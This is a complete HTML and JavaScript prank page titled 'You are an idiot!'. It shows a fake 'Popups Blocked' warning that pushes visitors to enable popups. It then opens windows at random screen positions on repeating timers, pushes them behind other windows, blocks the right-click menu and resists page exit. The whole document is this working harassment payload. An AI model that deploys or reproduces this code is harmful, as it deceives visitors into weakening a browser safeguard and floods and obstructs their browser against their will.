<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>You are an idiot!</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body { 
      background: #000; 
      overflow: hidden;
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100vw;
      height: 100vh;
      font-family: Arial, sans-serif;
    }
    video { 
      width: 100%; 
      height: 100%; 
      object-fit: cover;
    }
    #popupWarning {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.95);
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      z-index: 10000;
    }
    #popupWarning.hide {
      display: none;
    }
    .warning-content {
      text-align: center;
      color: #fff;
      position: relative;
    }
    .warning-title {
      font-size: 3rem;
      color: #ff0;
      margin-bottom: 20px;
      animation: blink 1s infinite;
      text-transform: uppercase;
      font-weight: bold;
    }
    @keyframes blink {
      0%, 50% { opacity: 1; }
      51%, 100% { opacity: 0.3; }
    }
    .warning-text {
      font-size: 1.5rem;
      margin-bottom: 30px;
    }
    .arrow-container {
      position: fixed;
      top: 20px;
      right: 20px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .arrow {
      font-size: 6rem;
      animation: bounce 1s infinite;
      color: #ff0;
      transform: rotate(-45deg);
      text-shadow: 0 0 20px #ff0;
    }
    @keyframes bounce {
      0%, 100% { transform: rotate(-45deg) translateY(0); }
      50% { transform: rotate(-45deg) translateY(-20px); }
    }
    .arrow-text {
      color: #ff0;
      font-size: 1.2rem;
      font-weight: bold;
      margin-top: -20px;
      animation: textPulse 1s infinite;
      text-transform: uppercase;
    }
    @keyframes textPulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }
    .click-here {
      position: fixed;
      top: 5px;
      right: 150px;
      background: #ff0;
      color: #000;
      padding: 10px 20px;
      border-radius: 50px;
      font-weight: bold;
      font-size: 1.1rem;
      animation: pulse 1s infinite;
      box-shadow: 0 0 30px #ff0;
      text-transform: uppercase;
    }
    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.1); }
    }
  </style>
</head>
<body>
  <video id="mainVideo" autoplay loop muted style="display: none;">
    <source src="tu_video.mp4" type="video/mp4">
  </video>

  <div id="popupWarning">
    <div class="warning-content">
      <div class="warning-title">⚠ Popups Blocked ⚠</div>
      <div class="warning-text">Enable popups to continue</div>
    </div>
    <div class="arrow-container">
      <div class="arrow">➤</div>
      <div class="arrow-text">Allow popups!</div>
    </div>
  </div>

  <script>
    let popupsEnabled = false;
    const openWindows = [];
    let checkingPopups = false;

    function canOpenPopups() {
      if (checkingPopups) return false;
      checkingPopups = true;
      
      try {
        const testWin = window.open('about:blank', '_blank', 'width=1,height=1,left=10000,top=10000');
        
        if (!testWin) {
          checkingPopups = false;
          return false;
        }
        
        if (testWin.closed) {
          checkingPopups = false;
          return false;
        }
        
        if (typeof testWin.closed === 'undefined') {
          checkingPopups = false;
          return false;
        }
        
        testWin.close();
        checkingPopups = false;
        return true;
      } catch (e) {
        checkingPopups = false;
        return false;
      }
    }

    function updatePopupStatus() {
      const enabled = canOpenPopups();
      
      if (enabled && !popupsEnabled) {
        popupsEnabled = true;
        document.getElementById('popupWarning').classList.add('hide');
        document.getElementById('mainVideo').style.display = 'block';
      } else if (!enabled && popupsEnabled) {
        popupsEnabled = false;
        document.getElementById('popupWarning').classList.remove('hide');
        document.getElementById('mainVideo').style.display = 'none';
      }
      
      return enabled;
    }

    function abrirVentanaQueHuye() {
      if (!popupsEnabled) return;
      
      const width = 400;
      const height = 300;
      const x = Math.floor(Math.random() * (screen.availWidth - width));
      const y = Math.floor(Math.random() * (screen.availHeight - height));
      
      try {
        const nuevaVentana = window.open('popup_flee.html', '_blank', `width=${width},height=${height},left=${x},top=${y},resizable=no`);
        if (nuevaVentana && !nuevaVentana.closed) {
          nuevaVentana.blur();
          openWindows.push(nuevaVentana);
        } else {
          updatePopupStatus();
        }
      } catch (e) {
        updatePopupStatus();
      }
    }

    function abrirVentanaQueRodea() {
      if (!popupsEnabled) return;
      
      const width = 300;
      const height = 250;
      const x = Math.floor(Math.random() * (screen.availWidth - width));
      const y = Math.floor(Math.random() * (screen.availHeight - height));
      
      try {
        const nuevaVentana = window.open('popup_orbit.html', '_blank', `width=${width},height=${height},left=${x},top=${y},resizable=no`);
        if (nuevaVentana && !nuevaVentana.closed) {
          nuevaVentana.blur();
          openWindows.push(nuevaVentana);
        } else {
          updatePopupStatus();
        }
      } catch (e) {
        updatePopupStatus();
      }
    }

    updatePopupStatus();

    document.addEventListener('click', updatePopupStatus);
    document.addEventListener('focus', updatePopupStatus);

    setInterval(() => {
      if (updatePopupStatus()) {
        for (let i = 0; i < 3; i++) {
          setTimeout(() => abrirVentanaQueHuye(), i * 300);
        }
        for (let i = 0; i < 2; i++) {
          setTimeout(() => abrirVentanaQueRodea(), i * 400);
        }
      }
    }, 3000);

    setInterval(() => {
      if (popupsEnabled && openWindows.length < 10) {
        if (Math.random() > 0.5) {
          abrirVentanaQueHuye();
        } else {
          abrirVentanaQueRodea();
        }
      }
    }, 2500);

    window.addEventListener('beforeunload', (e) => {
      e.preventDefault();
      e.returnValue = '';
      return '';
    });

    document.addEventListener('contextmenu', (e) => e.preventDefault());
  </script>
</body>
</html>
